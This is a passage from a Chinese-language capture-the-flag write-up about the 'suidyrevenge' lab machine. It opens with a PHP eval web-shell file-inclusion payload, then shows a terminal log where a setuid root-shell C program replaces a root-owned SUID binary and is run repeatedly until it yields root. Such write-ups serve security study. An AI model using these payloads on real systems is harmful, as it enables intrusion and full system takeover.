payload:?file=data:text/plain,<?php @eval($_POST['a']) ?>
```

好久没有用了都忘记了，记录一下！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404181846310.jpg" alt="img" style="zoom:50%;" />

### 群主解法

群主还利用命令执行的空隙直接卡到rootshell了，也是一个很牛逼的解法我在这里浅浅复现一下：

```bash
suidy@suidyrevenge:/home/suidy$ vi exploit.c
suidy@suidyrevenge:/home/suidy$ gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:3:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setenv
suidy@suidyrevenge:/home/suidy$ ls -la
total 104
drwxrwxr-x 3 suidy suidy    4096 Apr 18 06:43 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw-r--r-- 1 suidy theuser    94 Apr 18 06:24 a.c
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
-rwxr-xr-x 1 suidy theuser 16664 Apr 18 06:43 exploit
-rw-r--r-- 1 suidy theuser    77 Apr 18 06:43 exploit.c
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxr-xr-x 1 suidy theuser 16712 Apr 18 06:42 payload
-rw-r--r-- 1 root  root       92 Apr 18 06:41 payload.c
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsr-sr-x 1 root  root    16712 Apr 18 06:40 suidyyyyy
suidy@suidyrevenge:/home/suidy$ ls -l exploit
-rwxr-xr-x 1 suidy theuser 16664 Apr 18 06:43 exploit
suidy@suidyrevenge:/home/suidy$ ls -l suidyyyyy 
-rwsr-sr-x 1 root root 16712 Apr 18 06:40 suidyyyyy
suidy@suidyrevenge:/home/suidy$ cp exploit suidyyyyy 
cp: cannot create regular file 'suidyyyyy': Permission denied
suidy@suidyrevenge:/home/suidy$ rm suidyyyyy 
rm: remove write-protected regular file 'suidyyyyy'? 
suidy@suidyrevenge:/home/suidy$ ls -la
total 104
drwxrwxr-x 3 suidy suidy    4096 Apr 18 06:43 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw-r--r-- 1 suidy theuser    94 Apr 18 06:24 a.c
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
-rwxr-xr-x 1 suidy theuser 16664 Apr 18 06:43 exploit
-rw-r--r-- 1 suidy theuser    77 Apr 18 06:43 exploit.c
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxr-xr-x 1 suidy theuser 16712 Apr 18 06:42 payload
-rw-r--r-- 1 root  root       92 Apr 18 06:41 payload.c
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsr-sr-x 1 root  root    16712 Apr 18 06:40 suidyyyyy
suidy@suidyrevenge:/home/suidy$ rm suidyyyyy 
rm: remove write-protected regular file 'suidyyyyy'? y
suidy@suidyrevenge:/home/suidy$ cp exploit suidyyyyy 
suidy@suidyrevenge:/home/suidy$ ls -l suidyyyyy 
-rwxr-xr-x 1 suidy theuser 16664 Apr 18 06:44 suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy 
suidy@suidyrevenge:/home/suidy$ 
suidy@suidyrevenge:/home/suidy$ 
suidy@suidyrevenge:/home/suidy$ 
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy
root@suidyrevenge:/home/suidy# ./suidyyyyy
root@suidyrevenge:/home/suidy# cat exploit.c 
#include<stdlib.h>
int main(void){
    setuid(0);
    system("/bin/bash");
}
```

